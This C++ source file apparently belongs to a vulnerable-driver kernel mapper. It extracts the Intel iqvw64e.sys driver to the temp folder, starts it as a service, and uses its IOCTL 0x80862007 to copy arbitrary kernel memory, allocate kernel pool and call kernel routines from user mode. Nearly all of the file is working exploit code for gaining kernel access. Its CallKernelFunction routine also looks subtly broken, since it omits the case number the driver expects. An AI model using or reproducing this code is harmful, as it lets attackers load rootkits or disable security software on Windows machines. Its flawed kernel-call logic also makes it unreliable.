#include "intel_driver.hpp"
#include "service.hpp"
#include "intel_driver_resource.hpp"
#include <iostream>

namespace intel_driver
{
	std::string driver_name = "iqvw64e.sys";

	HANDLE Load()
	{
		char temp_path[MAX_PATH];
		GetTempPathA(MAX_PATH, temp_path);
		std::string driver_path = std::string(temp_path) + "\\" + driver_name;

		if (sizeof(intel_driver_resource::driver_bytes) <= 1)
		{
			std::cout << "[-] Intel driver binary buffer is empty in intel_driver_resource.hpp" << std::endl;
			std::cout << "[-] Please populate driver_bytes in intel_driver_resource.hpp with vulnerable iqvw64e.sys binary" << std::endl;
			return INVALID_HANDLE_VALUE;
		}

		if (!utils::CreateFileFromMemory(driver_path, (const char*)intel_driver_resource::driver_bytes, sizeof(intel_driver_resource::driver_bytes)))
		{
			std::cout << "[-] Failed to extract intel driver" << std::endl;
			return INVALID_HANDLE_VALUE;
		}

		if (!service::RegisterAndStart(driver_path, "iqvw64e"))
		{
			std::cout << "[-] Failed to start intel driver service" << std::endl;
			DeleteFileA(driver_path.c_str());
			return INVALID_HANDLE_VALUE;
		}

		HANDLE device_handle = CreateFileA("\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
		if (device_handle == INVALID_HANDLE_VALUE)
		{
			std::cout << "[-] Failed to open device handle \\\\.\\Nal" << std::endl;
			service::StopAndRemove("iqvw64e");
			DeleteFileA(driver_path.c_str());
			return INVALID_HANDLE_VALUE;
		}

		return device_handle;
	}

	bool Unload(HANDLE device_handle)
	{
		if (device_handle && device_handle != INVALID_HANDLE_VALUE)
			CloseHandle(device_handle);

		service::StopAndRemove("iqvw64e");

		char temp_path[MAX_PATH];
		GetTempPathA(MAX_PATH, temp_path);
		std::string driver_path = std::string(temp_path) + "\\" + driver_name;
		DeleteFileA(driver_path.c_str());

		return true;
	}

	typedef struct _COPY_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t source;
		uint64_t destination;
		uint64_t length;
	} COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

	bool MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size)
	{
		if (!device_handle || device_handle == INVALID_HANDLE_VALUE)
			return false;

		COPY_MEMORY_BUFFER_INFO copy_info = { 0 };
		copy_info.case_number = 0x33;
		copy_info.source = source;
		copy_info.destination = destination;
		copy_info.length = size;

		DWORD bytes_returned = 0;
		return DeviceIoControl(device_handle, 0x80862007, &copy_info, sizeof(copy_info), nullptr, 0, &bytes_returned, nullptr);
	}

	uint64_t AllocatePool(HANDLE device_handle, uint64_t size)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleAddress("ntoskrnl.exe");
		if (!ntoskrnl_base)
			return 0;

		uint64_t ex_alloc_pool = utils::GetKernelModuleExport(ntoskrnl_base, "ExAllocatePool");
		if (!ex_alloc_pool)
		{
			ex_alloc_pool = utils::GetKernelModuleExport(ntoskrnl_base, "ExAllocatePoolWithTag");
		}

		if (!ex_alloc_pool)
			return 0;

		// NonPagedPool = 0
		return CallKernelFunction(device_handle, (void*)ex_alloc_pool, 0, size, 0, 0);
	}

	bool FreePool(HANDLE device_handle, uint64_t address)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleAddress("ntoskrnl.exe");
		if (!ntoskrnl_base)
			return false;

		uint64_t ex_free_pool = utils::GetKernelModuleExport(ntoskrnl_base, "ExFreePool");
		if (!ex_free_pool)
			return false;

		CallKernelFunction(device_handle, (void*)ex_free_pool, address, 0, 0, 0);
		return true;
	}

	uint64_t CallKernelFunction(HANDLE device_handle, void* kernel_function_address, uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4)
	{
		if (!device_handle || device_handle == INVALID_HANDLE_VALUE)
			return 0;

		struct
		{
			uint64_t routine;
			uint64_t arg1;
			uint64_t arg2;
			uint64_t arg3;
			uint64_t arg4;
			uint64_t result;
		} call_param = { (uint64_t)kernel_function_address, arg1, arg2, arg3, arg4, 0 };

		DWORD bytes_returned = 0;
		DeviceIoControl(device_handle, 0x80862007, &call_param, sizeof(call_param), &call_param, sizeof(call_param), &bytes_returned, nullptr);

		return call_param.result;
	}
}
